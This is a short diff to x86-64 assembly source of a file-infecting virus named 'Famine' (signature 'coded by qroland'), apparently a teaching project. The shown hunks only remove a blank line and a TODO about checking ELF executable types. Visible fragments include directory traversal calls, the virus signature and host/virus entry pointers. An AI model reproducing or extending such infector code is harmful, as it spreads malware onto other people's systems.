@@ -21,7 +21,6 @@ _start:
 
 	lea rdi, [rel target_1]
 	call _traverse_dir
-
 	lea rdi, [rel target_2]
 	call _traverse_dir
 
@@ -256,8 +255,3 @@ signature	db		"Famine version 1.0 (c)oded by qroland",0x0
 host_entry	dq		_exit
 virus_entry	dq		_start
 _finish:
-
-
-; TODO :
-; Add a check for EXEC or DYN type of x64
-; Call munmap and close
